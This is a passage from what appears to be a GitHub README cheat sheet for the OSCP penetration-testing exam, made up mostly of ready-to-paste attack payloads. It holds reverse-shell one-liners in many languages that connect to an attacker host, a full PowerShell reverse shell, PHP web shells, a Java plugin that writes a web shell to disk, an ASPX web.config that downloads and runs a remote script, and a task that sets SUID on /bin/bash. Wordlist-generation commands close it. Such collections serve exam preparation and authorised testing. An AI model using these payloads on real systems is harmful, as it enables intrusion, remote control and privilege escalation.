import java.nio.file.StandardOpenOption;

public class Main extends JavaPlugin {
   @Override
   public void onDisable() {
     super.onDisable();
   }

@Override
public void onEnable() {
  final String PHP_CODE = "<?php system($_GET['cmd']); ?>";
  try {
   Files.write(Paths.get("/var/www/<RHOST>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
   } catch (IOException e) {
     e.printStackTrace();
   }

   super.onEnable();
  }
}
```

##### Lua Reverse Shell

```c
http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
```

##### Markdown Reverse Shell

```c
--';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
```

##### mkfifo Reverse Shell

```c
mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
```

##### Netcat Reverse Shell

```c
nc -e /bin/sh <LHOST> <LPORT>
```

##### Perl Reverse Shell

```c
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

##### PHP Reverse Shell

```c
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

##### PowerShell Reverse Shell

```c
$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```c
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```c
powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

##### minireverse.ps1

```c
$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do
{
	$writer.Flush();
	$read = $null;
	$res = ""
	while($stream.DataAvailable -or $read -eq $null) {
		$read = $stream.Read($buffer, 0, 1024)
	}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$args = "";
		if($out.IndexOf(' ') -gt -1){
			$args = $out.substring($out.IndexOf(' ')+1);
			$out = $out.substring(0,$out.IndexOf(' '));
			if($args.split(' ').length -gt 1){
                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
                $pinfo.FileName = "cmd.exe"
                $pinfo.RedirectStandardError = $true
                $pinfo.RedirectStandardOutput = $true
                $pinfo.UseShellExecute = $false
                $pinfo.Arguments = "/c $out $args"
                $p = New-Object System.Diagnostics.Process
                $p.StartInfo = $pinfo
                $p.Start() | Out-Null
                $p.WaitForExit()
                $stdout = $p.StandardOutput.ReadToEnd()
                $stderr = $p.StandardError.ReadToEnd()
                if ($p.ExitCode -ne 0) {
                    $res = $stderr
                } else {
                    $res = $stdout
                }
			}
			else{
				$res = (&"$out" "$args") | out-string;
			}
		}
		else{
			$res = (&"$out") | out-string;
		}
		if($res -ne $null){
        $writer.WriteLine($res)
    }
	}
}While (!$out.equals("exit"))
$writer.close();
$socket.close();
$stream.Dispose()
```

##### Python Reverse Shell

```c
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```c
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```c
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
```

```c
echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE><(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE>
```

##### Ruby Reverse Shell

```c
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Web Shells

##### PHP Web Shell

```c
<?php system($_GET['cmd']); ?>
<?php echo exec($_POST['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php echo system($_REQUEST['shell']): ?>
```

### Templates

#### ASPX Web Shell

```c
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shellyjelly.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->
```

#### Bad YAML

```c
- hosts: localhost
  tasks:
    - name: badyml
      command: chmod +s /bin/bash
```

### Wordlists

#### Bash

##### Add Numbers to Password Segment

```c
for i in {1..100}; do printf "Password@%d\n" $i >> <FILE>; done
```

#### CeWL

```c
cewl -d 0 -m 5 -w <FILE> http://<RHOST>/index.php --lowercase
cewl -d 5 -m 3 -w <FILE> http://<RHOST>/index.php --with-numbers
```

#### CUPP

```c
./cupp -i
```

#### crunch

```c
crunch 6 6 -t foobar%%% > wordlist
crunch 5 5 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -o <FILE>.txt
```

#### JavaScript Quick Wordlist

```js
javascript:(function(){const e=document.documentElement.innerText.match(/[a-zA-Z_\-]+/g),n=[...new Set(e)].sort();document.open(),document.write(n.join("<br>")),document.close();})();
```

#### Mutate Wordlists

##### Remove all Number Sequences

```c
head /PATH/TO/WORDLIST/<WORDLIST> > <FILE>.txt
sed -i '/^1/d' <FILE>.txt
```


#### Username Anarchy

```c
./username-anarchy -f first,first.last,last,flast,f.last -i <FILE>
```


## Final Thoughts
The OSCP exam is challenging but rewarding. Mastery of the concepts, tools, and techniques discussed in this guide will greatly enhance your chances of success. Stay persistent, practice continuously, and keep expanding your knowledge in the field of penetration testing and ethical hacking.


## Contact

For any questions or feedback, please contact [E-Mail Me](mailto:fk776794@gmail.com?subject=Feedback%20on%20Faizan%20Net&body=Hello%20Faizan,%0A%0AI%20have%20some%20feedback%20to%20share%20about%20your%20Faizan%20Net%20tool.%0A%0A%2D%20Issue%2FComplaint%3A%20[Please%20describe%20the%20issue%20or%20complaint]%0A%2D%20Suggestions%2FChanges%3A%20[Please%20provide%20your%20suggestions%20or%20changes]%0A%0AThank%20you!%0A%0ARegards,%0A[Your%20Name])

<!-- display the social media buttons in your README -->

[![instagram](https://github.com/shikhar1020jais1/Git-Social/blob/master/Icons/Instagram.png (Instagram))][2]
[![twitter](https://github.com/shikhar1020jais1/Git-Social/blob/master/Icons/Twitter.png (Twitter))][3]
[![linkedin](https://github.com/shikhar1020jais1/Git-Social/blob/master/Icons/LinkedIn.png (LinkedIn))][4]
[![github](https://github.com/shikhar1020jais1/Git-Social/blob/master/Icons/Github.png (Github))][5]

<!-- To Link your profile to the media buttons -->

[2]: https://www.instagram.com/EthicalFaizan
[3]: https://www.twitter.com/EthicalFaizan
[4]: https://www.linkedin.com/in/EthicalFaizan
[5]: https://www.github.com/faizan-khanx

## GITHUB STATS

![Faizan's GitHub stats](https://github-readme-stats.vercel.app/api?username=faizan-khanx&show=reviews,discussions_started,discussions_answered,prs_merged,prs_merged_percentage&theme=dark#gh-dark-mode-only)